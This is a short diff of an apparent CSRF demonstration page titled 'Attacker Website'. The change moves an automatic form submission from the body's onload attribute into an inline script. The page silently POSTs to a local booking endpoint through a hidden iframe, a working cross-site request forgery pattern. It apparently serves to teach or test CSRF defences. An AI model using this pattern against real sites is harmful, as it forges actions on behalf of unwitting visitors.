@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Attacker Website</title>
 </head>
-<body onload="document.forms[0].submit()">
+<body>
   <h1>This Website is dangerous</h1>
 
   <form target="submitFrame" action="http://localhost:3000/booking" method="POST">
@@ -22,5 +22,9 @@
   </form>
 
   <iframe style="display: none" name="submitFrame" id="submitFrame"></iframe>
+
+  <script>
+    document.forms[0].submit();
+  </script>
 </body>
 </html>
